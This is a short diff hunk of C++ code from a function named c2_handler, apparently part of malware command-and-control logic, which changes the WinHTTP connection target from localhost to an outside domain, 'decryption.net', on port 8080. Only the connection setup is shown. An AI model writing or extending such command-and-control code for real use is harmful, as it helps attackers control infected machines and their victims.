@@ -14,7 +14,7 @@ boolean c2_handler(std::vector<BYTE>& outputData, const std::vector<BYTE>& input
         WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return false;
 
-    HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1",
+    HINTERNET hConnect = WinHttpConnect(hSession, L"decryption.net",
         8080, 0);
     if (!hConnect) {
         WinHttpCloseHandle(hSession);
